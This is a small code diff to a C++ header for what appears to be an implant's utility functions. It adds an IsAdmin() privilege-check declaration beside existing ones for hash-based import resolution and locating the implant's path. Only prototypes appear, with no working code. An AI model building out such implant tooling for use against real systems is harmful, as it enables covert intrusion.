@@ -17,5 +17,6 @@ std::vector<BYTE> LPBYTEToVector(LPBYTE bytes, size_t length);
 FARPROC HashImport(char* name);
 wchar_t* GetImplantPath();
 void PrintJsonType(const rapidjson::GenericValue<rapidjson::UTF8<>> *json);
+bool IsAdmin();
 
 #endif // IMPLANT_UTILS_H_
